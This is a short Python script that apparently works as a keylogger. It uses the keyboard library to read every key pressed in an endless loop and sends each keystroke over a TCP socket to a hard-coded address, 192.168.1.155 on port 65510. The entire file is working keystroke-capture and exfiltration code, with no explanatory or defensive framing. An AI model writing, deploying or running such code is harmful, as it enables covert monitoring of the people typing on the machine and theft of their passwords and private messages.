import keyboard
import socket
import time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect(("192.168.1.155",65510))

while True:
    key=keyboard.read_key()
    print(key)
    s.send(key.encode())
    time.sleep(0.1)
    
    

